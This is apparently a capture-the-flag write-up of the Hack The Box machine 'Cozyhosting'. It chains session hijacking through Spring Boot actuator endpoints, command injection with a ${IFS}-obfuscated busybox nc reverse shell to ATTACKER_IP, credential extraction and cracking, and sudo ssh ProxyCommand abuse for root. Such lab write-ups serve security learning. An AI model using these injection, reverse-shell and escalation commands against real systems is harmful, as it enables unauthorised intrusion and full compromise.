## Hello everyone!

Today, we will cover “*Cozyhosting*”*,* an easy-level machine from **Hack The Box**.

Without further ado, let’s get started!

(Ensure that you have added the following line  `TARGET_IP    cozyhosting.htb`  to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive Nmap scan to gather as much information as possible about the target:

![image](/HTB/CozyHosting/CozyHosting_images/1.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (nginx 1.18.0 (Ubuntu) | 80)

We can perform further enumeration of the web site using **Gobuster**:

![image](/HTB/CozyHosting/CozyHosting_images/2.png)

We can identify multiple endpoints, including an administrator login panel. When triggering an error on the website, we got a specific error message:

![image](/HTB/CozyHosting/CozyHosting_images/3.png)

After doing some research about it, we can learn that this behavior typically correspond a Spring Boot web application:

![image](/HTB/CozyHosting/CozyHosting_images/4.png)

From there, we can use an adapted wordlist which will focus on the Spring Boot technology and related endpoint. The wordlist can be found here: https://github.com/emadshanab/DIR-WORDLISTS/blob/main/spring-boot.txt

![image](/HTB/CozyHosting/CozyHosting_images/5.png)

We can identify a few resources attached to a `actuator` directory. The `actuator/sessions` endpoint is very interesting:

![image](/HTB/CozyHosting/CozyHosting_images/6.png)

This reveals an existing user: **kanderson**

There is a value which seems to be associated to a token. After inspecting the `/admin` portal endpoint, we can identify a `JSESSIONID` cookie session value in the DevTool:

![image](/HTB/CozyHosting/CozyHosting_images/7.png)

What happens if we paste the kanderson’s token in our browser before reloading the page?

![image](/HTB/CozyHosting/CozyHosting_images/8.png)

We successfully gain access to the restricted dashboard as the user kanderson through **session hijacking**!

We can spot an interesting SSH POST request made by the web application:

![image](/HTB/CozyHosting/CozyHosting_images/9.png)

Let’s fill in the fields and click on *Submit* after enabling our Burp Suite Proxy in order to catch the request:

![image](/HTB/CozyHosting/CozyHosting_images/10.png)

It looks like we can initiate a SSH connection through this POST request using the `host` and `username` parameter. But since we don’t have any valid credential, we can’t gain our initial access using this legitimately. Maybe we need to trick a vulnerable parameter in order to achieve command injection?

## Initial Access

After sending the request to Repeater and attempting to inject multiple strings in the provided parameters, we can confirm a command injection vulnerability in the `username` parameter using the following payload:

`host=TARGET_IP&username=test$(COMMAND_HERE)`

![image](/HTB/CozyHosting/CozyHosting_images/11.png)

We are able to execute arbitrary system command on the target! What happens if we try to initiate a reverse shell using `busybox nc ATTACKER_IP NC_PORT -e sh` ?

![image](/HTB/CozyHosting/CozyHosting_images/12.png)

It seems that the web application doesn’t accept whitespaces in the `username` parameter. This restriction can be bypass using `${IFS}` strings which represent a whitespace. We can then use the following payload to initiate a valid reverse shell:

`test$(busybox${IFS}nc${IFS}ATTACKER_IP${IFS}NC_PORT${IFS}-e${IFS}sh)`

(ensure that you have set up a netcat listener using `nc -lvnp PORT` in order to catch the connection)

![image](/HTB/CozyHosting/CozyHosting_images/13.png)

The request should hang and your netcat listener should receive the connection successfully, granting us initial access on the machine as the user **app**!

We can stabilize our current shell using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Listing our current directory reveals a `.jar` file which represent the java web’s application:

![image](/HTB/CozyHosting/CozyHosting_images/14.png)

After doing some research, we can learn that the .jar file contains a file where application-related properties are stored: this is the `application.properties` file. It may reveals useful information such as database information or something like this. We can confirm that the file exists using the following command:

`unzip -l cloudhosting-0.0.1.jar | grep application.properties`

![image](/HTB/CozyHosting/CozyHosting_images/15.png)

Now that we know the full path of the file, we can read its content with the following command:

`unzip -p cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties`

![image](/HTB/CozyHosting/CozyHosting_images/16.png)




## Lateral Movement



We can identify a cleartext PostgreSQL password for the user **postgres**! It means that we can now access the local database through a legitimate authentication and retrieve user-related information. We can connect via `psql`, navigate to the cozyhosting database and retrieve the users table content using the following commands:

`psql -h localhost -U postgres -W` (Connecting to the database)

(Provide the password)

`\c cozyhosting` (Selecting the database)

`\dt` (Listing available tables in the `cozyhosting` database)

`SELECT * FROM users;` (Dumping table’s content)

![image](/HTB/CozyHosting/CozyHosting_images/17.png)

We can identify the admin’s password hash! Although bcrypt is a strong hashing algorithm; however, weak passwords can still be cracked offline using brute-force techniques. We can paste the hash in a file and pass it to John in order to attempt offline cracking:

![image](/HTB/CozyHosting/CozyHosting_images/18.png)

The hash has been successfully cracked, we can recover the `manchesterunited` plaintext password. Maybe we can use it to pivot our access? Let’s get back to the target machine and inspect the /etc/passwd file to see whether there is other users present on the system:

![image](/HTB/CozyHosting/CozyHosting_images/19.png)

It looks like there is a user named **josh**.

What happens if we try to authenticate via SSH as **josh** using the password we recovered?

![image](/HTB/CozyHosting/CozyHosting_images/20.png)

It works! We successfully performed horizontal privilege escalation, through **password reuse**. We can now list our current directory and retrieve the user flag:

![image](/HTB/CozyHosting/CozyHosting_images/21.png)


## Privilege Escalation

We now need to escalate our current privileges to root in order to retrieve the final flag. We can start our local privilege escalation vectors enumeration using `sudo -l` to see whether, as **josh**, we are able to execute any command with **root privileges**:

![image](/HTB/CozyHosting/CozyHosting_images/22.png)

As we can see, we are able to run the `ssh` command providing any argument we want (specified by the wildcard(`*`)) as **root**. We can check GTFOBins to see how this binary can be leveraged to elevate our privileges: 

![image](/HTB/CozyHosting/CozyHosting_images/23.png)

The documentation provides two commands that can be used. Since the first `ssh localhost /bin/sh` is a legitimate SSH authentication, we cannot use it to escalate to **root** because we don’t have any valid password for the **root** user. However, the second command is interesting: 

`ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x`

This creates a privilege escalation vector because SSH allows passing arbitrary options using the `-o` flag.

One of these options, `ProxyCommand`, is intended to define how SSH connects through an intermediary host. However, it is executed through a system shell, which makes it vulnerable to command injection if not properly restricted.

By abusing this behavior, it is possible to inject a malicious command into the `ProxyCommand` parameter:

![image](/HTB/CozyHosting/CozyHosting_images/24.png)

We successfully escalate our privileges to **root**, granting us full access on the target system! We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/CozyHosting/CozyHosting_images/25.png)

Challenge completed!

![image](/HTB/CozyHosting/CozyHosting_images/26.png)





## Conclusion


The *Cozyhosting* machine is a great example of how multiple relatively small misconfigurations can be chained together to achieve full system compromise. We began with basic enumeration, which led us to a Spring Boot application exposing sensitive endpoints through the Actuator interface. This ultimately allowed us to perform session hijacking and gain access to an authenticated administrative panel.

From there, we identified a vulnerable SSH-related feature in a POST request, which resulted in a command injection in the `username` parameter. By bypassing input restrictions using `${IFS}`, we achieved initial access to the system as the **app** user.

Further enumeration revealed a Java application archive containing sensitive configuration data, including cleartext database credentials. This enabled us to access the PostgreSQL database, extract user credentials, and obtain a cracked password, which allowed lateral movement to the **josh** user via SSH.

Finally, privilege escalation was achieved by abusing a misconfigured `sudo` permission on the `ssh` binary. By leveraging the `ProxyCommand` option, we executed arbitrary commands as root and obtained **full control of the system**.

Overall, this machine highlights the importance of secure session management, proper input validation, secure credential storage, and strict sudo privilege configurations. A weakness in any of these areas can lead to full system compromise when chained together.

**Thank you for reading!**
